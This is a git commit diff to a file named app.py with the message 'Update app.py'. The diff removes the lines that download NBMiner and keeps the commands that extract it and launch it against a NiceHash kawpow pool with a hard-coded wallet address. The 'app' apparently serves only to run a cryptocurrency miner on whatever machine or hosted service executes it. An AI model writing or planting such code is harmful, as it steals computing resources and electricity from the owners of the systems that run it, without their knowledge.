351b939cc55113a3f5c30f1b5d652d781e18c38b
charpn <120244637+charpn@users.noreply.github.com>
2022-12-10 11:24:01 +0300

    Update app.py

--- app.py
+++ app.py
@@ -1,8 +1,5 @@
 import os
 import subprocess
 import tarfile
-os.system('sudo apt update')
-os.system('sudo apt install wget')
-os.system('wget https://github.com/NebuTech/NBMiner/releases/download/v42.3/NBMiner_42.3_Linux.tgz')
 os.system('tar -xvf NBMiner_42.3_Linux.tgz')
 os.system('./NBMiner_Linux/nbminer -a kawpow -o stratum+ssl://kawpow.auto.nicehash.com:443 -u NHbPqef6CnXTCjdXXRBqQGvWD43Skb6QFUxh.gpu')
